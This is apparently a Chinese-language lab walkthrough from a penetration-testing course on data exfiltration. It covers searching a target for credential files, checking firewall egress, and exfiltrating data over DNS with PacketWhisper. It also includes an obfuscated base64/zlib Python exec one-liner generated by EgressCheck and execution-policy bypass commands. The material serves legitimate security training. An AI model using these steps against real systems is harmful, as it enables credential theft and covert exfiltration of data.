---
layout: post
title: "Data Exfiltration"
date: "2021-08-26"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Penetration Testing Prerequisites
---

## 学习目标

* 评估防火墙设置
* 利用不够安全的防火墙设置
* 加密有趣的数据并使用DNS将其泄露
* 自动识别所有可能的数据泄露方式



## 推荐工具

* [Packet Whisper](https://github.com/TryCatchHCF/PacketWhisper)
* [Egress framework使用说明](https://labs.f-secure.com/archive/egress-checking/)
* [EgressCheck Framework](https://github.com/stufus/egresscheck-framework)



## 步骤

### 一、搜索有趣的文件

`win+r cmd.exe`启动cmd。通过执行以下命令搜索有趣的文件：

```cmd
cd /

dir /s /b passwords.txt

dir /s /b credentials.txt
```

`/s`：列出指定目录和所有子目录中每次出现的指定文件名。

`/b`：显示目录和文件的裸列表，没有附加信息。`/b`参数覆盖`/w`。

`/w`：以宽格式显示列表，每行最多包含五个文件名或目录名。

也可以使用正则表达式进行匹配：

```cmd
dir *credentials* /s /p
```

`/p`：一次显示一屏列表。要查看下一个屏幕，请按任意键。

查看文件内容：

```cmd
type filename
```

参考文档：[dir](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir)、[Pentesting in the Real World: Local File Inclusion with Windows Server Files](https://www.rapid7.com/blog/post/2016/07/29/pentesting-in-the-real-world-local-file-inclusion-with-windows-server-files/)、[When All You Can Do Is Read](https://digi.ninja/blog/when_all_you_can_do_is_read.php)、[Password Storage Locations For Popular Windows Applications](http://www.nirsoft.net/articles/saved_password_location.html)、[Windows Blind Files](http://pwnwiki.io/#!presence/windows/blind.md)。



### 二、检查目标主机上安装的脚本语言

在 Windows 终端 (cmd.exe) 中时，还要检查是否安装了任何脚本语言。

您可以通过执行以下命令来检查 PowerShell 和 Python：

```cmd
python --version

powershell ls
```

上述命令的成功执行表明这些脚本语言（Python 和 PowerShell）实际上已安装（或允许）在目标机器上。

这些脚本语言包含有用的功能，渗透测试人员可以在渗透测试的所有阶段利用这些功能。



或者从 Windows 命令行获取已安装应用程序列表：

方法一（首选）：

1. 打开命令行窗口 (`Windows + R`, `CMD.EXE`)
2. 输入 `wmic` (Enter)
3. 输入 `product get name` (Enter)

方法二（A PowerShell script to list them）:

```powershell
$loc = Get-ChildItem HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall

$names = $loc |foreach-object {Get-ItemProperty $_.PsPath}

foreach ($name in $names)
{
    Write-Host $name.Displayname
}
```

参考文章：[从 Windows 命令行获取已安装应用程序列表](https://superuser.com/questions/68611/get-list-of-installed-applications-from-windows-command-line)。



### 三、手动确定目标机器是否允许任何常用端口出站连接

要手动确定机器是否允许任何常用端口出站连接，请按照以下步骤操作。

对于端口 80 (TCP)、443 (TCP)、8080 (TCP)、8443 (TCP)，过程如下：

1. 在你的 Kali 机器上启动一个 Python 服务器，指定选择的端口。

   为了启动 Python 服务器，您需要启动一个新终端；转到 Kali 中要共享文件的目录（例如*/tmp*），然后输入：

   ```bash
   cd /tmp <- To navigate to the /tmp directory
   
   python -m SimpleHTTPServer 8080
   ```

   在这种情况下，端口 8080 处于打开状态并等待 Kali 机器上的连接，但您可以指定任何 1 - 65,535 端口中的任何一个。

   我们将测试目标机器的防火墙是否允许端口 8080 (TCP) 出站 Internet 连接。

   参考链接：[How to use SimpleHTTPServer](https://www.pythonforbeginners.com/modules-in-python/how-to-use-simplehttpserver/)。

   

2. 在目标机器上启动浏览器并访问 http://[tap0 Kali IP]:port_of_choice

   为此，只需让目标机器上的浏览器访问 http://[tap0 Kali IP]:8080（在测试端口 8080 是否允许出站连接时），然后查看 Python 服务器页面是否加载。

   如果是这种情况，则允许该端口进行出站连接，否则，防火墙将阻止对该特定端口的访问。

   该网站将向您展示Python 服务器启动的*/tmp*目录（如果存在）的文件。如果存在任何文件，您将能够下载它们。

   

3. 对于端口 53 (UDP)，过程是：

   注意：如果您在真实环境中，您可以启动 Wireshark 并查看是否可以“嗅探”来自目标机器的任何 DNS 请求。如果是这种情况，则端口 53 (UDP) 将被允许出站连接。

   在实验室环境中，可以更改目标系统的 DNS 设置并将 Kali 机器的 tap0 IP 配置为 DNS 服务器。然后，在目标机器上启动浏览器，并尝试访问任意页面（如google.com）。现在，转到启动 Wireshark 的 Kali 机器。观察目标机器发出的 DNS 流量。此类捕获的流量意味着防火墙允许 DNS 流量出站（端口 53 UDP）。

   

4. 一些补充知识，与本次Data Exfiltration有一定相关性：

   `nslookup`可以查看默认DNS服务器。

   

   **四、将查询直接指向特定的 DNS 服务器**

   对于基本的 A 和 CNAME 记录，您可以简单地操作

   ```cmd
   nslookup somewhere.com some.dns.server
   ```

   ```cmd
   Usage: 
      nslookup [-opt ...]             # interactive mode using default server
      nslookup [-opt ...] - server    # interactive mode using 'server'
      nslookup [-opt ...] host        # just look up 'host' using default server
      nslookup [-opt ...] host server # just look up 'host' using 'server'
   ```

   参考链接：[How can I direct a query to specific DNS server?](https://superuser.com/questions/367969/how-can-i-direct-a-query-to-specific-dns-server)。

   

   `netstat`可以查看已建立的TCP连接。

   

   **五、Telnet测试开放的TCP端口**：

   首先通过命令提示符启用Telnet客户端：

   以管理员权限打开命令提示符，并运行以下命令：

   ```cmd
   Dism /Online /Enable-feature /FeatureName:TelnetClient
   ```

   运行该命令后，Telnet就可用于检查开放的TCP端口。

   或者，对于命令提示，您可以使用以下PowerShell命令实现相同的结果：

   ```powershell
   Install-WindowsFeature -name Telnet-Client
   ```

   然后，使用Telnet测试打开端口：

   Telnet 命令`telnet [domainname or ip] [port]`将允许您测试与给定端口上的远程主机的连接。

   将您尝试连接到的服务器的 IP 地址或域名代替 [domain name or ip]，然后用远程机器上的端口号替换[port]，该端口号是您要测试的连接。

   例如，验证到192.168.0.10的25端口上的连接。

   ```cmd
   telnet 192.168.0.10 25
   ```

   如果**连接成功**，将显示**空白屏幕**，这意味着计算机端口是打开的。连接失败时将附带错误消息。它可以指示关闭端口或指示的远程服务器没有在所提供的端口上监听的事实。

   注意：Telnet只允许测试TCP端口。

   

   **`nc`可以测试 Tcp 和 Udp 的端口。**

   Tcp

   ```shell
   nc -z -v [hostname/IP address] [port number] 
    
   nc -z -v 192.168.10.12 22 
   Connection to 192.168.10.12 22 port [tcp/ssh] succeeded! 
   ```

   Udp

   ```shell
   nc -z -v -u [hostname/IP address] [port number] 
    
   nc -z -v -u 192.168.10.12 123 
   Connection to 192.168.10.12 123 port [udp/ntp] succeeded!
   ```

   

   也可以使用以下PowerShell命令：

   ```powershell
   Test-NetConnection 128.159.1.1 -Port 80
   ```

   或者是使用`nmap`。

   参考链接：[Using telnet to Test Open Ports](https://www.acronis.com/en-sg/articles/telnet/)、[Can I use Telnet to test a UDP port?](https://www.quora.com/Can-I-use-Telnet-to-test-a-UDP-port)、[In Windows, using the command line, how do you check if a remote port is open?](https://serverfault.com/questions/35218/in-windows-using-the-command-line-how-do-you-check-if-a-remote-port-is-open)。

   

   `ipconfig /all`可以查看以太网卡的物理地址、IPv4地址、默认网关、DNS服务器等。



​		**找出所有在 Linux 网络上连接的实时主机 IP 地址:**

​		运行下面的Nmap命令：

```shell
nmap -sn 172.16.91.0/24
```

* `-sn`是扫描类型，这意味着 ping 扫描。默认情况下，Nmap 执行端口扫描，但此扫描将禁用端口扫描。

* `172.16.91.0/24`是目标网络。

  参考链接：[Find Out All Live Hosts IP Addresses Connected on Network in Linux](https://www.tecmint.com/find-live-hosts-ip-addresses-on-linux-network/)。

  

  **使用命令提示符更改 DNS 服务器**

  Windows 中的首选 DNS 服务器可以通过命令提示符更改。

  1. 以管理员权限运行命令提示符。

  2. 键入`netsh`并按Enter 键。

  3. 在`netsh>`提示符下，输入`interface ip show config`，然后按Enter。

  4. 找到要更改 DNS 服务器的网络连接。

  5. 输入`interface ip set dns "Ethernet0" static 8.8.8.8`并按Enter。将Ethernet0替换为您的连接名称，将8.8.8.8替换为您要使用的 DNS 服务器。

  参考链接：[How to Change DNS Servers in Windows](https://www.lifewire.com/how-to-change-dns-servers-in-windows-2626242)



### 六、通过DNS请求窃取数据

根据你确定的允许出站连接的端口，更隐蔽的方式是通过UDP53端口。[PacketWhisper](https://github.com/TryCatchHCF/PacketWhisper)可以通过DNS请求窃取数据。

PacketWhisper 是一个基于 Python 的工具，需要 Python 安装在目标机器上。

为了便于传输，还可以将PacketWhisper下载为压缩文件，如下所示：

```bash
wget https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip
```

然后，您可以在保存压缩版本 PacketWhisper 的目录中运行 Python 服务器，指定先前标识的开放端口 8080。

```shell
python -m SimpleHTTPServer 8080
```

最后，您可以再次使用目标机器上的浏览器访问您的 tap0 IP 和端口 8080，以便下载该工具。

请记住，您要下载的文件必须位于您启动 Python 服务器的目录中。

因为已经将目标机器的默认DNS服务器修改为kali的ip，所以，目标机器会向kali发送DNS查询。

在目标机器上使用PacketWhisper产生DNS查询流量，在Kali上使用Wireshark捕获这些流量。然后，另存为`Wireshark/tcpdump/...- pcap`格式。在Kali上使用PacketWhisper对保存的pcap文件进行解密。

关于PacketWhisper的重要说明：我们使用 DNS 查询来传输数据，而不是成功的 DNS 查找。PacketWhisper 永远不需要成功解析其任何 DNS 查询。事实上，PacketWhisper 甚至不查看 DNS 响应。这扩展了我们的用例，并强调了这样一个事实：我们永远不需要控制我们正在查询的域，永远不需要控制处理 DNS 请求的 DNS 名称服务器。

经过测试：在Select PacketWhisper Transfer Mode中，1）Unique Random Subdomain FQDNs (Recommended - avoids DNS caching, overcomes NAT); 2）Unique Repeating FQDNs (DNS may cache, but overcomes NAT)中的所有ciphers都可以正常使用。



### 七、自动枚举所有渗透路径

在渗透测试期间，我们需要自动化大部分经常执行的活动以节省时间。

让我们使用[EgressCheck Framework](https://github.com/stufus/egresscheck-framework#egresscheck-framework)来看看它如何自动识别允许出站连接的端口。该工具的使用说明：[Egress Checking](https://labs.f-secure.com/archive/egress-checking/)。

工具机制

该工具将允许您从目标机器的每个端口连接到kali，并让您查看哪些连接成功，这将有效地识别防火墙中的漏洞。

基本方法是：

- 生成可以在客户端上运行的“单行命令”。目前，ECF 可以在 python 和 powershell 中生成单行程序。
- 使用 tcpdump 来监控到你的机器的连接。ECF 将打印您需要运行以执行必要的捕获和过滤的命令。如果在 TCP 模式下使用，它只查找 SYN数据包。Tcpdump 将被配置为保存过滤后的捕获文件。
- 解析 tcpdump 文件，从中可以以多种格式显示结果，对其他工具有用或仅用于报告。目前，*tshark*被用作pcap 解析器；ECF 提供了要传递给 tshark 的参数。

```shell
./ecf.py
```

将攻击者的IP设置为TARGETIP。

使用`generate powershell-cmd`，可以获得一个 PowerShell 命令，该命令将帮助我们自动化防火墙评估。此加密命令包含的代码将使目标机器的PowerShell 尝试访问 Kali 机器上给定范围内的每个端口。

在目标机器上运行该程序之前，需要满足以下要求：

* 将此命令传输到目标机器上
* 在kali上运行Wireshark
* 在目标机器上执行该命令

可以使用Python服务器和目标机器上允许出站连接的端口8080传输命令。

为此，首先进入 egresscheck 框架生成 BAT 文件的目录*/tmp*。Egresscheck 会通过一条消息通知您此 BAT 文件的位置，该消息类似于以下内容：

`Also written to: /tmp/egress_xxxxxxxxx_xxxxxx_xxxxxx.bat`中。

要使用 Python 服务器提供此文件，请执行以下操作：

```python
cd /tmp
python -m SimpleHTTPServer 8080
```

使用目标机器的浏览器访问http://[tap0 Kali IP]:8080。

下载 egress 框架生成的 .bat 文件。

接下来，回到你的 Kali 机器，再次执行 Wireshark 并指向它在 tap0 接口上监听。

最后，在目标机器上右键点击下载的BAT文件，点击“以管理员身份运行”。

在你的 Kali 机器上访问 Wireshark 并观察流量。一小段时间后，Wireshark 将收到一个发往端口 9000 的数据包——这意味着该端口也被允许在目标机器的防火墙上进行出站连接。



注意：`tcpdump -i tap0`指定通过特定的接口tap0捕获数据包。

经测试：

1. `generate python-cmd`生成的`.sh`文件，可以在Linux上执行。

   ```cmd
   python -c 'import base64,sys,zlib;exec(zlib.decompress(base64.b64decode("eJxVU9tO4zAQffdXWLzUEamVdNWudsUglUtXq1JYaIGHqkJp6lJDLpbtalu+fj12AtmXZOZkzjkzY0eWqtaWmjp/F5bIJjsaMgX35OIgLZlAISpyBTqrXgW5BFlZsodA4Q3zos3Hk5fft9cLYlpgfnc5fbn69TCetfJWloJ8AL64KYRQ5AkSnn5+3mmRbWT1ShbwGfN8r7Wo7MID5KbzpYGeO5Co9qXQmRXkHQZD8gYn6fcBT0f8R8rT5IQoB/RHw+G34QnZiC29ZlLF6z/RT0KtPron/Qt7dhGbCENuhF0XbhonzZIWqja2Zj3eixtuwPOiNoK5WBxyoSxKqcwY77LGShzRoNG21lRRWVGPYKHvQqHOB3uKPOWeqQyLj3DH3mMXB55Enu/zhtlMvwoL69i9DbC3WEYRNw612MYtLFhDskh6ZihH5RZTQ6va0lsEqOVvtaxYsL1ju7g1Xq4IfYQJ8+Zyyx7Pdl5iB4+dZq5YQI88U8rthi1XrnwMSadGZb5iOV61RTIKvYwB2K6feoVAoqIwIqSnkBKqhd1rN7Nvr2BqjrUH35wGNedGFdKyXtzrbkijQHOgtITL4IeG5XlCs2pDyzO8BSNfQA9tWyWWfR0gFSBbg36vlZgwEQEMArU1oXTmbMQyWUUhzX2aNmlHk7YjJT5zgrOmpzz05OPZGeRNOU6Vh1XP4vy0WVa37bwxaTf3v8UX/IU20cFv9cFfjQzcdv1JuxASZEzZAC904YfOonMP3jO8D1P8HxyR+OAfTWgxdA==")))'
   ```

   如果要在Windows上执行，需要将包含python代码的单引号修改为双引号，将包含base64值的双引号修改为单引号：

   ```cmd
   python -c "import base64,sys,zlib;exec(zlib.decompress(base64.b64decode('eJxVU9tO4zAQffdXWLzUEamVdNWudsUglUtXq1JYaIGHqkJp6lJDLpbtalu+fj12AtmXZOZkzjkzY0eWqtaWmjp/F5bIJjsaMgX35OIgLZlAISpyBTqrXgW5BFlZsodA4Q3zos3Hk5fft9cLYlpgfnc5fbn69TCetfJWloJ8AL64KYRQ5AkSnn5+3mmRbWT1ShbwGfN8r7Wo7MID5KbzpYGeO5Co9qXQmRXkHQZD8gYn6fcBT0f8R8rT5IQoB/RHw+G34QnZiC29ZlLF6z/RT0KtPron/Qt7dhGbCENuhF0XbhonzZIWqja2Zj3eixtuwPOiNoK5WBxyoSxKqcwY77LGShzRoNG21lRRWVGPYKHvQqHOB3uKPOWeqQyLj3DH3mMXB55Enu/zhtlMvwoL69i9DbC3WEYRNw612MYtLFhDskh6ZihH5RZTQ6va0lsEqOVvtaxYsL1ju7g1Xq4IfYQJ8+Zyyx7Pdl5iB4+dZq5YQI88U8rthi1XrnwMSadGZb5iOV61RTIKvYwB2K6feoVAoqIwIqSnkBKqhd1rN7Nvr2BqjrUH35wGNedGFdKyXtzrbkijQHOgtITL4IeG5XlCs2pDyzO8BSNfQA9tWyWWfR0gFSBbg36vlZgwEQEMArU1oXTmbMQyWUUhzX2aNmlHk7YjJT5zgrOmpzz05OPZGeRNOU6Vh1XP4vy0WVa37bwxaTf3v8UX/IU20cFv9cFfjQzcdv1JuxASZEzZAC904YfOonMP3jO8D1P8HxyR+OAfTWgxdA==')))"
   ```

   或者直接将`.sh`文件中的python代码部分复制到python交互式命令行中执行。

   原因如下：

   在 Windows 上，反转引用以`-c`用双引号引用参数，例如`python -c "print 'Hello'"`。

   命令行由 python.exe 中的 C 运行时启动代码解析，它遵循[解析 C++ 命令行参数中](https://msdn.microsoft.com/en-us/library/17w5ykft)列出的规则。此外，cmd.exe 通常会忽略双引号字符串中的许多特殊字符（% 除外）。例如，`python -c 'print 2 > 1'`不仅没有被 Python 正确解析，而且 cmd.exe 重定向`stdout`到一个名为`1'`的文件. 相反，`python -c "print 2 > 1"`工作正常，即打印`True`.

   一个问题是处理命令行上的 % 字符，例如`python -c "print '%username%'"`. 如果您不希望 cmd.exe 扩展环境变量，您可以使用 `%^ `将 `% `转义到引号之外。`^` 字符是 cmd 的转义字符，因此您希望它是相反的，即 `^%`。但是，cmd 实际上不使用 `^`来转义 `%`。相反，它防止它被解析`username%`为环境变量。这需要引用的`-c`论点部分如下：`python -c "print '"%^"username%'"`。在这种特殊情况下，由于命令的其余部分没有空格或特殊字符，因此可以更简单地写为`python -c "print "'%^username%'`.

   参考链接：[Using 'python -c' option in Windows command prompt](https://stackoverflow.com/questions/32266621/using-python-c-option-in-windows-command-prompt)。

   

2. `generate python`可以在目标win10的Python 2.7.13上运行。
3. `generate powershell-cmd`可以在powershell版本5.0.10586.63上执行。
4. `generate powershell` 生成的ps1，即使修改了poweshell的默认安全级别，也不能在powershell版本5.0.10586.63上正常执行。

补充知识：

查看powershell版本：`$PSVersionTable`。

[Why are my PowerShell scripts not running?](https://stackoverflow.com/questions/10635/why-are-my-powershell-scripts-not-running)

它可能是 PowerShell 的默认安全级别，它 (IIRC) 将只运行签名脚本。

尝试输入：

```powershell
set-executionpolicy remotesigned
```

这将告诉 PowerShell 允许运行本地（即在本地驱动器上）未签名的脚本。

然后再次尝试执行您的脚本。

你需要运行`Set-ExecutionPolicy`：

```powershell
Set-ExecutionPolicy Restricted <-- Will not allow any powershell scripts to run.  Only individual commands may be run.

Set-ExecutionPolicy AllSigned <-- Will allow signed powershell scripts to run.

Set-ExecutionPolicy RemoteSigned <-- Allows unsigned local script and signed remote powershell scripts to run.

Set-ExecutionPolicy Unrestricted <-- Will allow unsigned powershell scripts to run.  Warns before running downloaded scripts.

Set-ExecutionPolicy Bypass <-- Nothing is blocked and there are no warnings or prompts.
```

